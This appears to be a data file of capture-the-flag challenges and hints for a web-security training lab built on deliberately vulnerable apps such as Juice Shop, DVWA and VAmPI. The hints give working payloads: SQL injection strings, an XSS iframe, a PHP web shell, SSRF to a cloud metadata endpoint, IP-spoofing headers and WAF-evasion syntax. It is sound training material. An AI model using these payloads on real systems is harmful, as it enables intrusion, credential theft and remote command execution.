challenges.title: Cloud Metadata Heist
challenges.description: The SSRF-Cloud app has a URL fetcher that lets you request any URL. Cloud instances often have a metadata service running at a well-known IP address. Can you use the URL fetcher to steal the cloud credentials?

hints.text: AWS metadata service runs at IP 169.254.169.254
Try fetching http://ssrf-lab:3000/latest/meta-data/ through the URL fetcher

challenges.title: Internal Service Discovery
challenges.description: Beyond the metadata endpoint, there are other internal services running on the SSRF-Cloud server. Can you discover the hidden admin panel that's only accessible internally?

hints.text: Internal services often run on the same host
Try accessing http://ssrf-lab:3000/internal/admin through the fetcher

challenges.title: Debug Config Leak
challenges.description: Developers sometimes leave debug endpoints exposed on internal networks. The SSRF-Cloud server might have a debug configuration endpoint leaking sensitive information. Can you find it?

hints.text: Debug endpoints often use paths like /debug, /config, or /debug/config
Fetch http://ssrf-lab:3000/debug/config through the URL fetcher

challenges.title: Juice Shop — Admin Login
challenges.description: OWASP Juice Shop has an admin account. Can you find the admin's email and log into their account? The login form might be vulnerable to a classic attack.

hints.text: SQL Injection is a common vulnerability in login forms
Try using ' OR 1=1-- as the email with any password

challenges.title: Juice Shop — XSS Alert
challenges.description: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts. Find a reflected XSS vulnerability in Juice Shop and trigger an alert box.

hints.text: Search functionality often reflects user input without sanitization
Try injecting <iframe src='javascript:alert(`xss`)'> in the search bar

challenges.title: DVWA — SQL Injection Basics
challenges.description: DVWA has a SQL Injection exercise on the Low security level. Extract the password hash for the admin user from the database.

hints.text: Set DVWA Security to Low, then go to SQL Injection page
Try: ' UNION SELECT user, password FROM users--

challenges.title: DVWA — File Upload Shell
challenges.description: DVWA's File Upload feature on Low security doesn't properly validate uploads. Can you upload a PHP web shell and execute commands on the server?

hints.text: Create a PHP file with <?php system($_GET['cmd']); ?>
After upload, access the file at /hackable/uploads/your-file.php?cmd=whoami

challenges.title: WebGoat — Authentication Bypass
challenges.description: WebGoat teaches various authentication vulnerabilities. Complete the Authentication Bypass lesson where you need to verify your identity using security questions — but with a twist.

hints.text: Intercept the request with a proxy like Burp Suite
Try modifying the security question parameters — change secQuestion0 and secQuestion1 parameter names

challenges.title: VAmPI — IDOR Attack
challenges.description: VAmPI has an Insecure Direct Object Reference (IDOR) vulnerability. Can you access another user's data by manipulating API parameters?

hints.text: Register a user, then try accessing other users' endpoints
Try GET /users/v1/admin with your auth token

challenges.title: VAmPI — Mass Assignment
challenges.description: VAmPI's user update endpoint doesn't properly filter input parameters. Can you escalate your privileges by sending extra fields in the update request?

hints.text: Mass Assignment means the API accepts more fields than intended
Try adding 'admin': true to your PUT /users/v1/update request body

challenges.title: Rate Limit Bypass
challenges.description: The Target-App has rate limiting enabled (50 req/min). But rate limiting implementations can sometimes be bypassed. Can you find a way to make unlimited requests?

hints.text: Rate limiters often track by IP address — what if you can change how the server sees your IP?
Try adding X-Forwarded-For header with a different IP to each request

challenges.title: Hidden Admin Panel
challenges.description: The Target-App has some admin endpoints for managing rate limits. But there might be other hidden admin endpoints that the developers forgot to remove. Can you find the secret one?

hints.text: Try directory brute-forcing paths under /admin/
Common hidden paths: /admin/secret, /admin/flag, /admin/secret-flag

challenges.title: Service Enumeration
challenges.description: Metasploitable2 is running many vulnerable services. Use nmap or similar tools to enumerate all open ports and identify the services. What version of vsftpd is running?

hints.text: Use: nmap -sV <target-ip> to detect service versions
vsftpd runs on port 21 — the version contains a known backdoor

challenges.title: WAF Bypass — SQL Injection
challenges.description: ModSecurity WAF is protecting the Target-App. The WAF blocks common SQL injection patterns. Can you craft a payload that bypasses the WAF rules and reaches the backend?

hints.text: WAFs often use pattern matching — try encoding or obfuscating your payload
Try URL encoding, case variation, or comment injection: /*!UNION*/ /*!SELECT*/

challenges.title: Find the Easter Egg
challenges.description: Every good CTF has an Easter egg. This dashboard might be hiding something in its source code or API responses. Can you find the hidden flag?

hints.text: Developers sometimes leave comments in HTML source code
Check the browser developer tools — Network tab, Response headers, or page source
